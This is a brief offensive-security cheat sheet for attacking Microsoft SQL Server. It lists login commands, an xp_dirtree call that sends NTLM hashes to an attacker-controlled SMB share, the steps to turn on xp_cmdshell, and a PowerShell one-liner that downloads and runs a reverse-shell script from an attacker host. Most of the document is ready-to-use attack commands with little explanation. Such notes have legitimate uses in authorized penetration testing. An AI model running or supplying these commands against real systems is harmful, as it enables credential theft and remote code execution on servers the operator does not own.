# MSSQL

## Login it to mssql remotely

```
sqsh -S $ip -U sa -P <PASSWORD>
```

alternatively use

```
mssqlclient.py user:password@$ip -windows-auth
```

or without --windows-auth

```
mssqlclient.py user:password@$ip
```

## Interactive with MSSQL

Check for users with SA level permissions (users that can enable xp\_cmdshell)

```
select IS_SRVROLEMEMBER ('sysadmin')
```

Run after spinning up an smbserver to capture hash

```
exec xp_dirtree '\\<attacker ip>\<share name>\',1,1
```

**Check if xp\_cmdshell is enabled**

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

**Show Advanced Options**

```
sp_configure 'show advanced options', '1'
```

```
RECONFIGURE
```

**Enable xp\_cmdshell**

```
sp_configure 'xp_cmdshell', '1'
```

```
RECONFIGURE
```

```
EXEC master..xp_cmdshell 'whoami'
```

{% code overflow="wrap" %}
```
xp_cmdshell powershell iex(new-objectnet.webclient).downloadstring(\"http://AttackerIP/Invoke-PowerShellTcp.ps1\")
```
{% endcode %}
